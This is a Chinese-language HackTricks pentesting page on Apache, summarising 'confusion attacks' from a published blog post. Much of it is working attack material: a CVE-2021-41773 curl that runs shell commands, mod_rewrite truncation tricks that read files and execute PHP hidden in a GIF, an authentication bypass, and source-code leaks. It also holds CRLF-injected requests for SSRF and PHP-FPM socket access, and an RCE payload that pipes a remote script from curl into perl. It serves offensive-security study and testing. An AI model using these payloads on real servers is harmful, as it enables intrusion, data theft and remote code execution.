<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Apache</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="apache"><a class="header" href="#apache">Apache</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="可执行的-php-扩展"><a class="header" href="#可执行的-php-扩展">可执行的 PHP 扩展</a></h2>
<p>检查哪些扩展正在执行 Apache 服务器。要搜索它们，可以执行：</p>
<pre><code class="language-bash">grep -R -B1 "httpd-php" /etc/apache2
</code></pre>
<p>此外，您可以找到此配置的一些地方是：</p>
<pre><code class="language-bash">/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
</code></pre>
<h2 id="cve-2021-41773"><a class="header" href="#cve-2021-41773">CVE-2021-41773</a></h2>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
</code></pre>
<p>{% endcode %}</p>
<h2 id="混淆攻击"><a class="header" href="#混淆攻击">混淆攻击 <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a></a></h2>
<p>这些类型的攻击已被<a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1"><strong>Orange在这篇博客文章中介绍和记录</strong></a>，以下是总结。 "混淆"攻击基本上利用了多个模块在创建Apache时并未完美同步工作的方式，使得其中一些模块修改一些意外数据可能导致后续模块中的漏洞。</p>
<h3 id="文件名混淆"><a class="header" href="#文件名混淆">文件名混淆</a></h3>
<h4 id="截断"><a class="header" href="#截断">截断</a></h4>
<p>**<code>mod_rewrite</code>**将在字符<code>?</code>之后修剪<code>r-&gt;filename</code>的内容（<a href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141"><em><strong>modules/mappers/mod_rewrite.c#L4141</strong></em></a>）。这并不是完全错误，因为大多数模块会将<code>r-&gt;filename</code>视为URL。但在其他情况下，这将被视为文件路径，这会导致问题。</p>
<ul>
<li><strong>路径截断</strong></li>
</ul>
<p>可以像以下规则示例一样滥用<code>mod_rewrite</code>，通过简单地添加一个<code>?</code>来访问文件系统中的其他文件，去掉预期路径的最后一部分：</p>
<pre><code class="language-bash">RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
</code></pre>
<ul>
<li><strong>误导 RewriteFlag 分配</strong></li>
</ul>
<p>在以下重写规则中，只要 URL 以 .php 结尾，它就会被视为 php 并执行。因此，可以在 <code>?</code> 字符后发送一个以 .php 结尾的 URL，同时在路径中加载一个不同类型的文件（如图像），其中包含恶意的 php 代码：</p>
<pre><code class="language-bash">RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a &lt;?=`id`;&gt;

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<h4 id="acl-bypass"><a class="header" href="#acl-bypass"><strong>ACL Bypass</strong></a></h4>
<p>即使访问应该被拒绝，仍然可以访问用户不应该能够访问的文件，配置如下：</p>
<pre><code class="language-xml">&lt;Files "admin.php"&gt;
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
&lt;/Files&gt;
</code></pre>
<p>这是因为默认情况下，PHP-FPM 将接收以 <code>.php</code> 结尾的 URL，例如 <code>http://server/admin.php%3Fooo.php</code>，并且因为 PHP-FPM 会删除字符 <code>?</code> 之后的任何内容，之前的 URL 将允许加载 <code>/admin.php</code>，即使之前的规则禁止了它。</p>
<h3 id="documentroot-confusion"><a class="header" href="#documentroot-confusion">DocumentRoot Confusion</a></h3>
<pre><code class="language-bash">DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
</code></pre>
<p>一个关于Apache的有趣事实是，之前的重写将尝试从documentRoot和根目录访问文件。因此，对<code>https://server/abouth.html</code>的请求将检查文件系统中的<code>/var/www/html/about.html</code>和<code>/about.html</code>。这基本上可以被滥用来访问文件系统中的文件。</p>
<h4 id="服务器端源代码泄露"><a class="header" href="#服务器端源代码泄露"><strong>服务器端源代码泄露</strong></a></h4>
<ul>
<li><strong>泄露CGI源代码</strong></li>
</ul>
<p>只需在末尾添加一个%3F就足以泄露cgi模块的源代码：</p>
<pre><code class="language-bash">curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
</code></pre>
<ul>
<li><strong>泄露 PHP 源代码</strong></li>
</ul>
<p>如果服务器有不同的域名，其中一个是静态域名，这可以被滥用来遍历文件系统并泄露 php 代码：</p>
<pre><code class="language-bash"># Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
</code></pre>
<h4 id="本地小工具操控"><a class="header" href="#本地小工具操控"><strong>本地小工具操控</strong></a></h4>
<p>之前攻击的主要问题是，默认情况下，大多数对文件系统的访问将被拒绝，如Apache HTTP Server的<a href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">配置模板</a>：</p>
<pre><code class="language-xml">&lt;Directory /&gt;
AllowOverride None
Require all denied
&lt;/Directory&gt;
</code></pre>
<p>然而，默认情况下，<a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165">Debian/Ubuntu</a> 操作系统允许 <code>/usr/share</code>：</p>
<pre><code class="language-xml">&lt;Directory /usr/share&gt;
AllowOverride None
Require all granted
&lt;/Directory&gt;
</code></pre>
<p>因此，在这些发行版中，<strong>滥用位于 <code>/usr/share</code> 内的文件是可能的。</strong></p>
<p><strong>本地小工具导致信息泄露</strong></p>
<ul>
<li><strong>Apache HTTP Server</strong> 与 <strong>websocketd</strong> 可能会在 <strong>/usr/share/doc/websocketd/examples/php/</strong> 暴露 <strong>dump-env.php</strong> 脚本，这可能会泄露敏感环境变量。</li>
<li>使用 <strong>Nginx</strong> 或 <strong>Jetty</strong> 的服务器可能会通过其默认的网页根目录暴露敏感的Web应用程序信息（例如，<strong>web.xml</strong>），这些根目录位于 <strong>/usr/share</strong> 下：</li>
<li><strong>/usr/share/nginx/html/</strong></li>
<li><strong>/usr/share/jetty9/etc/</strong></li>
<li><strong>/usr/share/jetty9/webapps/</strong></li>
</ul>
<p><strong>本地小工具导致XSS</strong></p>
<ul>
<li>在安装了 <strong>LibreOffice</strong> 的 Ubuntu Desktop 上，利用帮助文件的语言切换功能可能导致 <strong>跨站脚本攻击 (XSS)</strong>。通过操纵 <strong>/usr/share/libreoffice/help/help.html</strong> 的 URL，可以重定向到恶意页面或旧版本，使用 <strong>不安全的 RewriteRule</strong>。</li>
</ul>
<p><strong>本地小工具导致LFI</strong></p>
<ul>
<li>如果安装了 PHP 或某些前端包，如 <strong>JpGraph</strong> 或 <strong>jQuery-jFeed</strong>，其文件可能被利用来读取敏感文件，如 <strong>/etc/passwd</strong>：</li>
<li><strong>/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php</strong></li>
<li><strong>/usr/share/javascript/jquery-jfeed/proxy.php</strong></li>
<li><strong>/usr/share/moodle/mod/assignment/type/wims/getcsv.php</strong></li>
</ul>
<p><strong>本地小工具导致SSRF</strong></p>
<ul>
<li>利用 <strong>MagpieRSS的 magpie_debug.php</strong> 在 <strong>/usr/share/php/magpierss/scripts/magpie_debug.php</strong>，可以轻松创建 SSRF 漏洞，为进一步的攻击提供通道。</li>
</ul>
<p><strong>本地小工具导致RCE</strong></p>
<ul>
<li><strong>远程代码执行 (RCE)</strong> 的机会广泛，存在漏洞的安装如过时的 <strong>PHPUnit</strong> 或 <strong>phpLiteAdmin</strong>。这些可以被利用来执行任意代码，展示了本地小工具操作的广泛潜力。</li>
</ul>
<h4 id="从本地小工具越狱"><a class="header" href="#从本地小工具越狱"><strong>从本地小工具越狱</strong></a></h4>
<p>通过跟随在这些文件夹中安装的软件生成的符号链接，也可以从允许的文件夹中越狱，例如：</p>
<ul>
<li><strong>Cacti 日志</strong>: <code>/usr/share/cacti/site/</code> -&gt; <code>/var/log/cacti/</code></li>
<li><strong>Solr 数据</strong>: <code>/usr/share/solr/data/</code> -&gt; <code>/var/lib/solr/data</code></li>
<li><strong>Solr 配置</strong>: <code>/usr/share/solr/conf/</code> -&gt; <code>/etc/solr/conf/</code></li>
<li><strong>MediaWiki 配置</strong>: <code>/usr/share/mediawiki/config/</code> -&gt; <code>/var/lib/mediawiki/config/</code></li>
<li><strong>SimpleSAMLphp 配置</strong>: <code>/usr/share/simplesamlphp/config/</code> -&gt; <code>/etc/simplesamlphp/</code></li>
</ul>
<p>此外，滥用符号链接可以获得 <strong>Redmine中的RCE</strong>。</p>
<h3 id="处理程序混淆"><a class="header" href="#处理程序混淆">处理程序混淆 <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a></a></h3>
<p>此攻击利用了 <code>AddHandler</code> 和 <code>AddType</code> 指令之间功能的重叠，这两者都可以用来 <strong>启用 PHP 处理</strong>。最初，这些指令影响服务器内部结构中的不同字段（分别为 <code>r-&gt;handler</code> 和 <code>r-&gt;content_type</code>）。然而，由于遗留代码，Apache 在某些条件下可以互换处理这些指令，如果前者被设置而后者未设置，则将 <code>r-&gt;content_type</code> 转换为 <code>r-&gt;handler</code>。</p>
<p>此外，在 Apache HTTP Server (<code>server/config.c#L420</code>) 中，如果在执行 <code>ap_run_handler()</code> 之前 <code>r-&gt;handler</code> 为空，服务器 <strong>将 <code>r-&gt;content_type</code> 作为处理程序</strong>，有效地使 <code>AddType</code> 和 <code>AddHandler</code> 在效果上相同。</p>
<h4 id="覆盖处理程序以泄露-php-源代码"><a class="header" href="#覆盖处理程序以泄露-php-源代码"><strong>覆盖处理程序以泄露 PHP 源代码</strong></a></h4>
<p>在 <a href="https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf"><strong>这次演讲</strong></a> 中，展示了一个漏洞，其中客户端发送的错误 <code>Content-Length</code> 可能导致 Apache 错误地 <strong>返回 PHP 源代码</strong>。这是由于 ModSecurity 和 Apache Portable Runtime (APR) 的错误处理问题，导致双重响应覆盖 <code>r-&gt;content_type</code> 为 <code>text/html</code>。<br />
因为 ModSecurity 没有正确处理返回值，它会返回 PHP 代码而不会解释它。</p>
<h4 id="覆盖处理程序以-xxxx"><a class="header" href="#覆盖处理程序以-xxxx"><strong>覆盖处理程序以 XXXX</strong></a></h4>
<p>TODO: Orange 尚未披露此漏洞</p>
<h3 id="调用任意处理程序"><a class="header" href="#调用任意处理程序"><strong>调用任意处理程序</strong></a></h3>
<p>如果攻击者能够控制服务器响应中的 <strong><code>Content-Type</code></strong> 头，他将能够 <strong>调用任意模块处理程序</strong>。然而，在攻击者控制这一点时，请求的大部分处理过程将已经完成。然而，可以通过滥用 <code>Location</code> 头 <strong>重新启动请求过程</strong>，因为如果返回的 <code>Status</code> 为 200 且 <code>Location</code> 头以 <code>/</code> 开头，则响应被视为服务器端重定向，应进行处理。</p>
<p>根据 <a href="https://datatracker.ietf.org/doc/html/rfc3875">RFC 3875</a>（关于 CGI 的规范）在 <a href="https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2">第 6.2.2 节</a> 定义了本地重定向响应行为：</p>
<blockquote>
<p>CGI 脚本可以在 Location 头字段中返回 URI 路径和查询字符串（‘local-pathquery’）以指向本地资源。这向服务器指示应使用指定的路径重新处理请求。</p>
</blockquote>
<p>因此，要执行此攻击，需要以下漏洞之一：</p>
<ul>
<li>CGI 响应头中的 CRLF 注入</li>
<li>完全控制响应头的 SSRF</li>
</ul>
<h4 id="任意处理程序导致信息泄露"><a class="header" href="#任意处理程序导致信息泄露"><strong>任意处理程序导致信息泄露</strong></a></h4>
<p>例如，<code>/server-status</code> 应仅在本地可访问：</p>
<pre><code class="language-xml">&lt;Location /server-status&gt;
SetHandler server-status
Require local
&lt;/Location&gt;
</code></pre>
<p>可以通过将 <code>Content-Type</code> 设置为 <code>server-status</code> 并将 Location 头以 <code>/</code> 开头来访问它。</p>
<pre><code>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
</code></pre>
<h4 id="任意处理程序到完整的ssrf"><a class="header" href="#任意处理程序到完整的ssrf"><strong>任意处理程序到完整的SSRF</strong></a></h4>
<p>重定向到 <code>mod_proxy</code> 以访问任何URL上的任何协议：</p>
<pre><code>http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
</code></pre>
<p>然而，<code>X-Forwarded-For</code> 标头被添加以防止访问云元数据端点。</p>
<h4 id="任意处理程序访问本地-unix-域套接字"><a class="header" href="#任意处理程序访问本地-unix-域套接字"><strong>任意处理程序访问本地 Unix 域套接字</strong></a></h4>
<p>访问 PHP-FPM 的本地 Unix 域套接字以执行位于 <code>/tmp/</code> 的 PHP 后门：</p>
<pre><code>http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
</code></pre>
<h4 id="任意处理程序到-rce"><a class="header" href="#任意处理程序到-rce"><strong>任意处理程序到 RCE</strong></a></h4>
<p>官方的 <a href="https://hub.docker.com/_/php">PHP Docker</a> 镜像包含 PEAR (<code>Pearcmd.php</code>)，一个命令行 PHP 包管理工具，可以被滥用以获得 RCE：</p>
<pre><code>http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
</code></pre>
<p>检查 <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"><strong>Docker PHP LFI Summary</strong></a>，由 <a href="https://x.com/phithon_xg">Phith0n</a> 撰写，了解此技术的详细信息。</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1">https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1</a></li>
</ul>
<p>{% hint style="success" %}
学习与实践 AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/angular.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/artifactory-hacking-guide.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/angular.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/artifactory-hacking-guide.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
